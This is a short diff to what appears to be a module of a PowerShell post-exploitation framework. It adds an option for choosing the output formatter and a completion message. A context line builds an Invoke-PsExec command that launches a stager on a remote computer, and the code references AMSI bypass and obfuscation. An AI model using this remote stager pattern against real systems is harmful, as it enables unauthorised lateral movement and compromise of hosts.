@@ -47,6 +47,11 @@ class Module(object):
                 'Required'      :   True,
                 'Value'         :   ''
             },
+            'OutputFunction' : {
+                'Description'   :   'PowerShell\'s output function to use ("Out-String", "ConvertTo-Json", "ConvertTo-Csv", "ConvertTo-Html", "ConvertTo-Xml").',
+                'Required'      :   False,
+                'Value'         :   'Out-String'
+            },
             'Listener' : {
                 'Description'   :   'Listener to use.',
                 'Required'      :   False,
@@ -122,6 +127,8 @@ class Module(object):
 
     def generate(self, obfuscate=False, obfuscationCommand=""):
 
+        moduleName = self.info["Name"]
+
         # Set booleans to false by default
         Obfuscate = False
         AMSIBypass = False
@@ -190,7 +197,8 @@ class Module(object):
                     scriptEnd += "Invoke-PsExec -ComputerName %s -ServiceName \"%s\" -Command \"%s\"" % (computerName, serviceName, stagerCmd)
 
 
-        scriptEnd += "| Out-String | %{$_ + \"`n\"};"
+        outputf = self.options["OutputFunction"]["Value"]
+        scriptEnd += " | {outputf} | ".format(outputf=outputf) + '%{$_ + \"`n\"};"`n'+str(moduleName)+' completed!"'
 
         if obfuscate:
             scriptEnd = helpers.obfuscate(self.mainMenu.installPath, psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
